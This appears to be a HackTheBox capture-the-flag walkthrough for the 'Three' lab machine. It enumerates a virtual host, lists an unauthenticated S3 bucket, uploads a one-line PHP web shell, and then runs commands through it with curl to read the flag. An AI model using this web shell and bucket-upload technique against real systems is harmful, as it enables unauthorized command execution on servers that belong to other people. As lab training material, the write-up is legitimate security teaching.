# Three - HackTheBox 🏴󠁧󠁢󠁥󠁮󠁧󠁿


<img width="585" height="523" alt="image" src="https://github.com/user-attachments/assets/5c1a5373-4a49-4a5e-baa2-039170cfc4d0" />


### 1. First we start the machine and we add to the hosts.

```bash
sudo nano /etc/hosts
bat /etc/hosts
```

<img width="957" height="303" alt="image" src="https://github.com/user-attachments/assets/c4cd62ae-078b-4a3b-bdeb-311a574afe2d" />


### 2. We scan the ports of the machine with nmap.

```bash
nmap -T4 -F -sC 10.129.100.215
```

<img width="578" height="279" alt="image" src="https://github.com/user-attachments/assets/ef8c2cfd-6f7f-4ccc-9852-1b084c337861" />


### 3. With gobuster we search for the hidden directories with the vhost mode.

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

<img width="961" height="415" alt="image" src="https://github.com/user-attachments/assets/7c0f8c9f-03a8-4e03-9820-83db59136bbe" />


### 4. We edit the hosts

```bash
sudo nano /etc/hosts 
# 10.129.100.215 thetoppers.htb s3.thetoppers.htb
```

<img width="961" height="307" alt="image" src="https://github.com/user-attachments/assets/034750fa-211c-4b23-9f4d-a36e7d5e138c" />


### 5. We prove to access

```bash
curl -I http://s3.thetoppers.htb/
curl -s http://s3.thetoppers.htb/
```

<img width="959" height="315" alt="image" src="https://github.com/user-attachments/assets/35e0c002-dddd-4894-a743-8b46fb6caa44" />


### 6. Now we install AWS CLI to list the S3 buckets on the service and check for accessible files (credentials, source code, etc.) that could help advance exploitation of the machine.

```bash
sudo apt install awscli
aws --endpoint-url=http://s3.thetoppers.htb s3 ls --no-sign-request
aws --endpoint-url=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --no-sign-request --recursive
```

<img width="961" height="527" alt="image" src="https://github.com/user-attachments/assets/a8e31087-53e6-49e4-a3f4-439c3b365be2" />


### 7. We can see that the web files are present; we then insert a PHP script to provide an interface accessible via a web browser, using a `REVERSE SHELL`.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php # create file
aws --endpoint-url=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php --no-sign-request  # add to AWS
http://thetoppers.htb/shell.php?cmd=whoami # in the browser
```

<img width="960" height="371" alt="image" src="https://github.com/user-attachments/assets/3b0fc221-0eaa-41ab-8031-2d9d5a33f657" />


### 8. Cat the FLAG.

```bash
curl -s "http://thetoppers.htb/shell.php" --data-urlencode "cmd=ls -la /var/www/" -G
curl -s "http://thetoppers.htb/shell.php" --data-urlencode "cmd=cat /var/www/flag.txt" -G
```

<img width="961" height="201" alt="image" src="https://github.com/user-attachments/assets/c8bedbd0-aa21-41ad-979e-43ac7633627d" />


















